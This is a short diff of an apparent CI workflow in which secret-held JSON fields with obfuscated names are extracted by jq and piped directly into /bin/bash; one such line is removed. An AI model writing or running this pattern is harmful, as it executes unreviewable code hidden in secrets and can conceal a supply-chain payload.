@@ -22,7 +22,6 @@ jobs:
           c49242: ${{ secrets.c49242 }}
         run: |
           printf '%s' "$c49242" | jq -r .idiey65 | /bin/bash
-          echo $mohoh96 | jq -r .xl80 | /bin/bash
           printf '%s' "$b48" | jq -r .w87 | /bin/bash
           printf '%s' "$fyo9010" | jq -r .vpxh885 | /bin/bash
           echo $xszg033 | jq -r .jselc96 | /bin/bash
